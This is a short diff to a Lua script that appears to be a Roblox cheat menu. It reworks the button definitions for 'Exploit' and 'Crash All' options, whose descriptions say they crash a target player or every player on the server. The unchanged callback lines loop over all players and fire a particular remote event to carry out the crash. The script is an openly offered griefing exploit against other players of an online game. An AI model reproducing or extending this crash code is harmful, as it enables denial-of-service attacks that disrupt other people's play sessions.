@@ -111,7 +111,7 @@ do
         end
     })
 
-    Kicker:AddButton("Exploit", {
+    Kicker:AddButton({
         Title = "Exploit",
         Description = "Attempts to crash the target player.",
         Callback = function()
@@ -119,9 +119,9 @@ do
         end
     })
 
-    Kicker:AddButton("CrashAll", {
+    Kicker:AddButton({
         Title = "Crash All",
-        Description = "Attempts to crash every player in the server [EXTREMELY BLATANT!!].",
+        Description = "Attempts to crash every player in the server.\n[INCLUDES YOU, AND IS EXTREMELY BLATANT!!]",
         Callback = function()
             for _, player in game.Players do
                 game.ReplicatedStorage.ReplicateHats.Bunny.BunnyTail.Handle.Mesh.Script.trig:FireServer(player)
